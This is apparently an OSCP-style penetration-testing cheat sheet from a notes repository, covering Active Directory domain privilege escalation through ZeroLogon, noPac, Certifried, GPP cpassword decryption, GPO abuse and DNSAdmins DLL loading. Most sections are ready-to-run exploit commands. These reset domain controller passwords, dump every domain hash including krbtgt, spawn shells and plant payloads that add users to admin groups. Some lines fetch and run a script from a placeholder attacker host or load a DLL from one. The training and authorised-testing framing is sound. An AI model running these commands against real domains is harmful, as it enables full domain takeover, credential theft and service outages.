# AD Domain-Privesc CVEs & Misconfig Chains — OSCP-style Reference

*Complements `notes/ad-coercion-and-relay.md` (coercion + NTLM relay), `notes/ad-delegation-trust-bloodhound.md` (delegation/RBCD/BloodHound), and `notes/adcs-certipy-cheatsheet.md` (full ADCS ESC1–ESC16 exploitation) — none of the vectors below (ZeroLogon, noPac, Certifried, GPP cpassword, GPO abuse, DNSAdmins) had any entry in the repo prior to this file (verified by grep across `notes/`).*

**Exam caveat (applies throughout):** Metasploit is restricted on the OSCP exam to a single non-AD machine, never for pivoting, and the AD set is explicitly excluded from that allowance. None of the techniques below use Metasploit as the primary path — dedicated Python PoCs, Impacket, netexec, and native Windows tools are used instead. Where a Metasploit module exists as an alternative it is labeled and flagged, matching the pattern in `notes/service-enumeration-comprehensive.md`.

---

## 1. ZeroLogon (CVE-2020-1472)

**Explanation:** The Netlogon Remote Protocol (MS-NRPC) secure channel uses AES-CFB8 with an all-zero IV for `NetrServerAuthenticate3`. A flaw in the challenge/response construction means roughly 1-in-256 attempts produces a valid session with an **all-zero client credential**, regardless of the actual machine account password. Repeating the handshake (~256 tries, near-instant) lets an unauthenticated attacker on the network establish a Netlogon secure channel as the DC's own computer account, then call `NetrServerPasswordSet2` to **overwrite the DC machine account's AD password with an empty string**. From there, the DC's own account (`DC01$`) can be used with a blank password to DCSync the whole domain.

**Prerequisites:** Direct RPC/SMB reachability to the DC (TCP 135/445, dynamic RPC ports), unpatched DC (August 2020 patch enforces secure RPC by default; post-Feb-2021 patches close the hole entirely).

### Step 1 — read-only vulnerability check

```bash
git clone https://github.com/dirkjanm/CVE-2020-1472 zerologon_tester
python3 zerologon_tester/zerologon_tester.py DC01 10.10.10.10
```
Only sends the auth handshake and checks whether a zero credential is accepted — does **not** change the password. Safe to run repeatedly.

**Faster (nxc):**
```bash
nxc smb 10.10.10.10 -u '' -p '' -M zerologon
```

### Step 2 — exploit (resets the machine account password to empty)

```bash
git clone https://github.com/dirkjanm/CVE-2020-1472 zerologon_exploit
python3 zerologon_exploit/cve-2020-1472-exploit.py DC01 10.10.10.10
```
`DC01` must be the DC's NetBIOS name (not IP) — it's used in the RPC call itself. Output confirms once the password is reset in AD.

### Step 3 — dump hashes using the now-empty password

```bash
secretsdump.py -no-pass 'CORP.LOCAL/DC01$@10.10.10.10'
```
Authenticates as the DC's machine account with a blank password and performs a DCSync (`-just-dc` implied), dumping every domain hash including `krbtgt`.

### Step 4 — RESTORE THE MACHINE ACCOUNT PASSWORD (mandatory)

**Do this immediately after Step 3, in every engagement — including the OSCP exam.** Leaving the DC's Netlogon computer-account password blank breaks the DC's own secure channel to itself/other DCs: Netlogon authentication, replication, and Group Policy processing on that DC can fail until the account password is restored, which on a live exam or lab target is a real, self-inflicted outage.

```bash
# Requires the DC's *original* NT hash, captured from secretsdump.py output in Step 3
# (look for DC01$ in the ...:::  hash dump — that's the hash from BEFORE your exploit ran,
# secretsdump reads it from the SAM/NTDS state at dump time, so grab it in the same run)
python3 restorepassword.py 'CORP.LOCAL/DC01$@10.10.10.10' -target-ip 10.10.10.10 \
    -hexpass <original_nthash_hex>
```
`restorepassword.py` ships alongside `cve-2020-1472-exploit.py` in the same [dirkjanm/CVE-2020-1472](https://github.com/dirkjanm/CVE-2020-1472) repo. If you did not capture the original hash before exploiting, pull it from a prior `secretsdump.py` run against the DC (if you have one), an `ntds.dit` backup, or `reg.exe save` of the SAM/SECURITY hives taken before the reset — there is no other recovery path once the original password is gone.

**Reference:** [github.com/dirkjanm/CVE-2020-1472](https://github.com/dirkjanm/CVE-2020-1472) · [Secura whitepaper — Zerologon](https://www.secura.com/uploads/whitepapers/Zerologon.pdf) · [Microsoft ADV190023 / CVE-2020-1472](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2020-1472)

---

## 2. noPac / sAMAccountName spoofing (CVE-2021-42278 + CVE-2021-42287)

**Explanation:** Two bugs chained together. CVE-2021-42278 lets any authenticated user rename a machine account's `sAMAccountName` to match a Domain Controller's name minus the trailing `$` (e.g. `DC01`), which is not supposed to be permitted for non-admin-created accounts. CVE-2021-42287 is a KDC logic flaw in Kerberos S4U2Self ticket lookups — when the KDC cannot find a principal matching the requested (renamed) name with `$`, it silently retries without the `$`, resolving to the DC's real computer account. Chaining them: create a machine account (default `ms-DS-MachineAccountQuota` allows this), rename it to a DC's name, request a TGT for it, then rename it back — the KDC now issues an S4U2Self ticket that impersonates the DC itself, which is handed off as an Administrator TGT.

**Prerequisites:** Any valid low-privilege domain credential with rights to create a computer account (default quota is 10 per user), network access to the DC.

```bash
git clone https://github.com/Ridter/noPac
cd noPac
pip3 install -r requirements.txt

# End-to-end: create machine acct, rename, S4U2Self impersonation of Administrator, dump a TGT
python3 noPac.py CORP.LOCAL/lowpriv:'Password123!' -dc-ip 10.10.10.10 \
    -dc-host DC01 --impersonate administrator -use-ldap
```
On success this hands you a `.ccache` for Administrator (loaded automatically or saved to disk depending on flags). Use it directly:

```bash
export KRB5CCNAME=administrator.ccache
secretsdump.py -k -no-pass CORP.LOCAL/administrator@DC01.corp.local
# or drop a shell
psexec.py -k -no-pass CORP.LOCAL/administrator@DC01.corp.local
```

Add `-shell` to noPac.py's invocation to get an interactive semi-shell in one step, or `-dump` to have it DCSync directly without a separate secretsdump.py call.

**Faster (nxc):** netexec has a check module to confirm the sAMAccountName rename is possible before committing to the full chain:
```bash
nxc smb 10.10.10.10 -u lowpriv -p 'Password123!' -d CORP.LOCAL -M nopac
```

**Reference:** [github.com/Ridter/noPac](https://github.com/Ridter/noPac) · [Microsoft CVE-2021-42278](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42278) · [Microsoft CVE-2021-42287](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42287) · [Semperis — sAMAccountName spoofing writeup](https://www.semperis.com/blog/exploiting-samaccountname-spoofing-cve-2021-42278-and-cve-2021-42287/)

---

## 3. Certifried (CVE-2022-26923)

**Explanation:** ADCS variant of the sAMAccountName-spoofing bug above — instead of abusing S4U2Self/KDC confusion directly, it abuses the **certificate name-mapping** ambiguity: a low-privilege user renames a machine account's `sAMAccountName` to match a DC's name, requests a certificate off a template that maps identity via the (now DC-matching) `dNSHostName`/`sAMAccountName`, then renames back — the issued cert authenticates as the DC. This is functionally the ADCS "Machine" template abuse path and overlaps heavily with **ESC9 (no security extension)** and **ESC10 (weak certificate mapping)** territory.

**Don't duplicate here** — full Certipy-based exploitation (`certipy shadow`/`certipy req` with `-account`, ESC9/ESC10 walkthroughs, UPN-rewrite tricks) is already covered in `notes/adcs-certipy-cheatsheet.md`. The short version, for orientation:

```bash
certipy account update -u 'lowpriv@corp.local' -p 'Password123!' -user 'TARGETPC$' -dns 'dc01.corp.local'
certipy req -u 'TARGETPC$@corp.local' -p 'Password123!' -ca corp-CA -template Machine -dc-ip 10.10.10.10
certipy account update -u 'lowpriv@corp.local' -p 'Password123!' -user 'TARGETPC$' -dns 'TARGETPC.corp.local'  # restore
certipy auth -pfx dc01.pfx -dc-ip 10.10.10.10
```

See `notes/adcs-certipy-cheatsheet.md` for the full ESC1–ESC16 reference, template enumeration, and the UPN-restore hygiene notes that apply equally here.

**Reference:** [Microsoft CVE-2022-26923](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-26923) · [Oliver Lyak (ly4k) — Certifried writeup](https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4)

---

## 4. GPP cpassword (MS14-025)

**Explanation:** Group Policy Preferences (GPP) could push local admin passwords, drive mappings, and scheduled tasks with an embedded, **AES-256 encrypted** `cpassword` attribute in XML files under SYSVOL (`Groups.xml`, `Services.xml`, `ScheduledTasks.xml`, `DataSources.xml`, `Printers.xml`, `Drives.xml`). Microsoft published the **static AES private key** used for this encryption in their own SDK documentation, so any domain user with read access to SYSVOL (default for all authenticated users) can decrypt any cpassword found. MS14-025 (2014) stopped GPP from being able to *set* new passwords this way, but does not retroactively remove already-deployed XML files — this is still frequently found live on aged AD builds.

**Prerequisites:** Any authenticated domain user (SYSVOL is a default-readable share, `\\dc01\SYSVOL`).

### Manual — you already have the XML/cpassword string

```bash
# cpassword pulled from Groups.xml, e.g.:
# <Properties ... cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJ9xg8" .../>
gpp-decrypt 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJ9xg8'
```

### Automated — crawl SYSVOL and decrypt everything found

```powershell
# From a domain-joined foothold, PowerShell
IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/Get-GPPPassword.ps1')
Get-GPPPassword
```

```bash
# Manual SYSVOL grep from Linux, then feed hits to gpp-decrypt
smbclient -N //10.10.10.10/SYSVOL -c 'recurse; ls' 2>/dev/null
smbmap -H 10.10.10.10 -u lowpriv -p 'Password123!' -R SYSVOL -A '.*\.xml$' -q
grep -R "cpassword" /mnt/sysvol_loot/ 2>/dev/null
```

**Faster (nxc):**
```bash
nxc smb 10.10.10.10 -u lowpriv -p 'Password123!' -M gpp_password
nxc smb 10.10.10.10 -u lowpriv -p 'Password123!' -M gpp_autologin   # AutoLogon reg-pushed creds via GPP, separate loot
```
Both modules crawl SYSVOL over the existing SMB session and decrypt any cpassword found in one shot, no separate XML pull needed.

**Reference:** [Microsoft KB2962486 — GPP credentials disabled](https://support.microsoft.com/kb/2962486) · [github.com/t0thkr1s/gpp-decrypt](https://github.com/t0thkr1s/gpp-decrypt) · [github.com/outflanknl/Get-GPPPassword](https://github.com/outflanknl/Get-GPPPassword)

---

## 5. GPO abuse (edit rights on a GPO linked to a high-value OU)

**Explanation:** If a user/group has `GenericWrite`/`WriteProperty`/`GenericAll` on a GPO object (found via BloodHound's `GPLink`/GPO ACL edges) that is linked to an OU containing high-value targets (e.g. Domain Controllers, an admin workstation OU), that GPO can be modified to push an Immediate Scheduled Task or an Immediate User Task that runs attacker-controlled commands as SYSTEM (computer-targeted task) or as the logged-on user, on every machine in scope the next time policy refreshes.

**Prerequisites:** Confirmed GPO-edit ACE on a specific GPO (BloodHound: `GenericAll`/`WriteDacl`/`WriteOwner` on a `GPO` node with a `GPLink` to the target OU), the GPO's display name (from BloodHound or `Get-GPO -All`).

```
# SharpGPOAbuse.exe — from a foothold with the vulnerable GPO edit rights
# --AddComputerTask: runs as SYSTEM on every computer the GPO applies to
SharpGPOAbuse.exe --AddComputerTask --TaskName "Updater" \
    --Author CORP\lowpriv --Command "cmd.exe" \
    --Arguments "/c net localgroup administrators corp\\lowpriv /add" \
    --GPOName "Default Domain Policy"

# --AddUserTask: runs as whichever user logs on and is in scope of the GPO
SharpGPOAbuse.exe --AddUserTask --TaskName "Updater" \
    --Author CORP\lowpriv --Command "cmd.exe" \
    --Arguments "/c net localgroup administrators corp\\lowpriv /add" \
    --GPOName "Default Domain Policy"
```
`--GPOName` takes the GPO's display name (SharpGPOAbuse resolves it via an LDAP `displayName` lookup), not its GUID. Confirm the exact target GPO display name first: `Get-GPO -All | Select DisplayName, Id`.

**This does not take effect until Group Policy refreshes on the target.** From a session on the target machine, force it immediately rather than waiting for the default ~90-minute (±30 min randomized offset) client refresh interval:
```
gpupdate /force
```
Without an interactive session on the target, wait out the refresh interval before checking for the new local admin / scheduled task.

**Cross-platform alternative (no .NET/CLR needed on the operator box):** [pyGPOAbuse](https://github.com/synacktiv/pyGPOAbuse) implements the same Immediate Task GPO write from Linux via Impacket-style auth:
```bash
python3 pyGPOAbuse.py CORP.LOCAL/lowpriv:'Password123!' -gpo-id 31B2F340-016D-11D2-945F-00C04FB984F9 \
    -dc-ip 10.10.10.10 -command "net localgroup administrators corp\\lowpriv /add" -author lowpriv
```

**Reference:** [github.com/FSecureLABS/SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse) · [github.com/synacktiv/pyGPOAbuse](https://github.com/synacktiv/pyGPOAbuse) · [thehacker.recipes — GPO abuse](https://www.thehacker.recipes/ad/movement/group-policy)

---

## 6. DNSAdmins group membership → DC RCE (arbitrary DLL load)

**Explanation:** Members of the built-in `DNSAdmins` group can set the `dnscmd` `serverlevelplugindll` configuration, which points the Windows DNS Server service at an arbitrary DLL path to load on next start. The DNS service on a DC almost always runs as `NT AUTHORITY\SYSTEM` (and is usually running directly on the DC itself), so getting it to load an attacker DLL and restarting the service is equivalent to remote SYSTEM code execution on the DC. There is no dedicated CVE for this — it's an intended admin feature abused by a privileged group.

**Prerequisites:** Membership in `DNSAdmins` (or equivalent write access to `dnsserver` RPC config), network path to the DC's DNS service, a UNC-reachable path (SMB share) hosting the malicious DLL, and rights/ability to restart the DNS service (`DNSAdmins` members typically can do this remotely via `sc.exe`/`dnscmd` against the DC, or it can be done from a session already on the box).

```bash
# 1. Host a malicious DLL (custom C DLL, or msfvenom payload as a convenience alternative) on an attacker-controlled SMB share
msfvenom -p windows/x64/exec CMD='net group "Domain Admins" lowpriv /add /domain' \
    -f dll -o evil.dll

# 2. Point the DNS service's plugin DLL at the payload (UNC path, must be reachable by the DC)
dnscmd DC01 /config /serverlevelplugindll \\ATTACKER_IP\share\evil.dll

# 3. Restart the DNS service to trigger the load (this is the actual execution trigger)
sc.exe \\DC01 stop dns
sc.exe \\DC01 start dns
```
**Restarting the DNS service is disruptive and noisy** — DNS resolution on that DC is briefly unavailable while the service bounces, which can affect other clients/services relying on it for name resolution mid-engagement. Expect this to be visible in monitoring and factor the brief outage into timing on a live target.

**Exam caveat:** the `msfvenom` DLL generation above is a labeled convenience alternative, not a requirement — any DLL (a minimal custom C DLL exporting `DllMain`, or any other payload generator) works equally well for the `serverlevelplugindll` load, since this is standalone payload generation and not an interactive Metasploit/Meterpreter session or module run against the target. On the OSCP exam, prefer a non-Metasploit DLL if in doubt about scope; the exploitation primitive itself (`dnscmd`/`sc.exe`) does not touch Metasploit at all.

**Faster (nxc):** netexec automates the whole set-DLL-and-restart flow in one module call once you hold valid DNSAdmins-member credentials:
```bash
nxc smb 10.10.10.10 -u lowpriv -p 'Password123!' -M dnsadmin -o SERVER=DC01 DLL=\\\\ATTACKER_IP\\share\\evil.dll
```

**Reference:** [Shay Ber — From DNSAdmins to Domain Admin](https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83) · [Microsoft dnscmd /config reference](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/dnscmd-config) · [thehacker.recipes — DnsAdmins abuse](https://www.thehacker.recipes/ad/movement/dnsadmins)

---

## Cleanup / OPSEC checklist

- **ZeroLogon:** restore the DC machine account password (Section 1, Step 4) before ending the engagement session — non-negotiable, this one breaks the DC if skipped.
- **noPac:** the tool renames the rogue machine account back automatically as part of its flow; verify with `Get-ADComputer` if running the raw chain by hand instead of `noPac.py`.
- **Certifried / ADCS:** restore `dNSHostName`/UPN attributes to original values — see the restore-hygiene notes in `notes/adcs-certipy-cheatsheet.md`.
- **GPO abuse:** remove the Immediate Task from the GPO (`SharpGPOAbuse.exe` has no built-in undo — edit the GPO back out via `gpmc.msc`/`Remove-GPO`-equivalent manual cleanup) once objectives are met, since it persists and re-fires on every future policy refresh until removed.
- **DNSAdmins:** unset `serverlevelplugindll` (`dnscmd DC01 /config /serverlevelplugindll ""`) and restart DNS again to remove the loaded payload path.
